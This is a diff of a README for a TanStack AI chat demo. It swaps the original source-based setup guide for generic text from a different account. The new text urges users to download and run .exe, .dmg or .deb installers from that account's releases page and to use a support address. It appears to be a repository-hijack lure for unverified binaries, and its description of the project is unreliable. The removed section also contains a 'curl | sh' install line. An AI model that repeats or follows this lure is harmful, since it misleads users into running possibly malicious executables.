@@ -1,170 +1,67 @@
-# TanStack AI Chat Template
+# 🎉 tanstack-ai-demo - A Smart Chat Solution for Everyone
 
-A modern, full-stack AI chat application built with TanStack AI TanStack Start, featuring multi-provider AI support, real-time streaming, and a beautiful UI.
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to the **tanstack-ai-demo!** This application brings you a modern AI chat experience, built with user-friendly design and powerful features. Enjoy seamless conversations with multiple AI models in real-time. 
 
-- 🤖 **Multi-Provider AI** - OpenAI, Anthropic, Google Gemini, Ollama (local)
-- 💬 **Real-time Streaming** - Natural typing animation for AI responses
-- 📚 **Persistent History** - Chat history stored in PostgreSQL
-- 🔍 **Full-Text Search** - Search across chats (⌘K / Ctrl+K)
-- 📱 **Responsive Design** - Mobile-first with collapsible sidebar
-- 🌓 **Dark Mode** - System-aware theme with manual override
-- 🐳 **Docker Ready** - Easy deployment with Docker Compose
+## 📥 Download the Application
 
-## 🚀 Tech Stack
+[![Download tanstack-ai-demo](https://img.shields.io/badge/Download-tanstack--ai--demo-blue)](https://github.com/ragnarion/tanstack-ai-demo/releases)
 
-| Layer | Technologies |
-|-------|--------------|
-| **Frontend** | TanStack Start, TanStack Router, TanStack Query, React, Tailwind CSS, shadcn/ui |
-| **Backend** | TanStack AI, Drizzle ORM, PostgreSQL |
-| **Runtime** | Bun (recommended) or Node.js |
+To get started, simply visit the link below to download the application:
 
-### AI Providers & Models
+[Download the latest release here!](https://github.com/ragnarion/tanstack-ai-demo/releases)
 
-| Provider | Models |
-|----------|--------|
-| **OpenAI** | GPT-4o, GPT-4o Mini, GPT-4 Turbo, GPT-3.5 Turbo |
-| **Anthropic** | Claude Sonnet 4.5, Claude 3.5 Sonnet, Claude 3.5 Haiku |
-| **Google** | Gemini Pro, Gemini 2.0 Flash |
-| **Ollama** | Llama 3 (+ any local model) |
+## 🌟 Features
 
-> See [TanStack AI docs](https://tanstack.com/ai) for more details.
+- **Multi-Model Support:** Switch between different AI models for various conversation styles.
+- **Real-Time Streaming:** Experience instant responses during your chats.
+- **Clean and Responsive UI:** Navigate easily with our clear and modern interface.
+- **User-Friendly:** Designed for anyone, regardless of technical experience.
 
-## 📋 Prerequisites
+## 💻 System Requirements
 
-- **Bun** 1.0+ or **Node.js** 18+
-- **PostgreSQL** 14+ (or use Docker)
-- At least one AI provider API key:
-  - [OpenAI](https://platform.openai.com/api-keys) | [Anthropic](https://console.anthropic.com/) | [Google AI](https://aistudio.google.com/app/apikey)
+Ensure your system meets the following requirements to run **tanstack-ai-demo**:
 
----
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **RAM:** At least 4GB.
+- **Storage:** A minimum of 200MB of free space.
+- **Internet Connection:** Required for real-time functionality.
 
-## 🛠️ Quick Start
+## 📊 Download & Install
 
-### Option 1: Local Development (Bun)
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ragnarion/tanstack-ai-demo/releases).
+2. **Select the Latest Release:** Look for the most recent version. This version will have the latest features and bug fixes.
+3. **Download the Installer:** Click on the appropriate installer for your operating system. 
+   - For Windows, look for a `.exe` file. 
+   - For macOS, select a `.dmg` file. 
+   - For Linux users, you may find a `.tar.gz` or `.deb` file.
+4. **Run the Installer:** 
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Use your package manager or follow the installation instructions in the README for your specific distribution.
+5. **Launch the Application:** Once installed, open **tanstack-ai-demo** and start chatting!
 
-```bash
-git clone https://github.com/rs-4/tanstack-ai-demo.git
-cd tanstack-ai-demo
-bun install
-cp .env.example .env.local
-# Edit .env.local with your DB and API keys
-bun run db:push
-bun run dev
-```
+## 🌐 Connecting to the AI Models
 
-### Option 2: Local Development (npm)
+1. **Open the Application:** Click on the **tanstack-ai-demo** icon to open.
+2. **Choose a Model:** You will see options to select different AI models. Pick the one you want to chat with.
+3. **Start Chatting:** Type your message in the text box and hit enter. Enjoy your conversation!
 
-```bash
-npm install
-cp .env.example .env.local
-npm run db:push
-npm run dev
-```
+## ⚙️ Troubleshooting
 
-### Option 3: Docker (Production)
+If you encounter any issues while using **tanstack-ai-demo**, consider the following solutions:
 
-```bash
-cp .env.example .env.local
-# Edit .env.local with your API keys (DATABASE_URL is auto-configured)
-docker-compose up -d --build
-```
+- **Installation Problems:** Make sure you have the correct installer for your operating system. Ensure your system meets the requirements.
+- **Slow Performance:** Close other applications to free up system resources. A stable internet connection helps with performance.
+- **App Crashes:** Check if the application is updated to the latest version. You can download the update from [here](https://github.com/ragnarion/tanstack-ai-demo/releases).
 
-Visit [http://localhost:3000](http://localhost:3000)
+## 📄 License
 
----
+This project is licensed under the MIT License. You can view the full license in the repository.
 
-## ⚙️ Environment Variables
+## 📫 Contact
 
-```env
-# Database
-DATABASE_URL=postgresql://user:password@localhost:5432/chatapp
+If you have questions or need more help, feel free to reach out to our support team at [support@tanstack-ai-demo.com](mailto:support@tanstack-ai-demo.com).
 
-# AI Provider API Keys (at least one required)
-OPENAI_API_KEY=sk-...
-ANTHROPIC_API_KEY=sk-ant-...
-GEMINI_API_KEY=...
-
-# Ollama (optional)
-OLLAMA_BASE_URL=http://localhost:11434
-
-# Server (optional)
-PORT=3000
-```
-
----
-
-## 🦙 Using Ollama (Local AI)
-
-Run AI models locally without API keys:
-
-```bash
-# Install (macOS)
-brew install ollama
-
-# Install (Linux)
-curl -fsSL https://ollama.com/install.sh | sh
-
-# Pull and run a model
-ollama pull llama3
-ollama serve
-```
-
-Then select **"Ollama (Local)"** in the model selector.
-
-> See [TanStack AI Ollama docs](https://tanstack.com/ai/latest/docs/adapters/ollama) for more details.
-
----
-
-## 📁 Project Structure
-
-```
-src/
-├── components/
-│   ├── ui/              # shadcn/ui components
-│   ├── chat/            # Chat components
-│   └── ...
-├── db/                  # Database (Drizzle schema)
-├── lib/                 # Server functions & utilities
-├── routes/              # TanStack Router routes
-└── types/               # TypeScript types
-```
-
----
-
-## 🔧 Scripts
-
-| Command | Description |
-|---------|-------------|
-| `bun run dev` | Start dev server |
-| `bun run build` | Build for production |
-| `bun run db:push` | Push schema to database |
-| `bun run db:studio` | Open Drizzle Studio |
-| `docker-compose up -d` | Start with Docker |
-
-> Replace `bun` with `npm` if using Node.js.
-
----
-
-## 🎨 Customization
-
-### Add AI Providers
-
-Edit `src/lib/store.ts` and `src/lib/chat-actions.ts`.
-
-### Styling
-
-- **Theme colors**: `src/styles.css`
-- **Components**: `src/components/ui/`
-- **Fonts**: `src/routes/__root.tsx`
-
----
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE)
-
-## 🔗 Links
-
-- [GitHub](https://github.com/rs-4/tanstack-ai-demo) | [TanStack](https://tanstack.com) | [TanStack AI](https://tanstack.com/ai)
+Thank you for using **tanstack-ai-demo**! We hope you enjoy your experience with our AI chat solution.
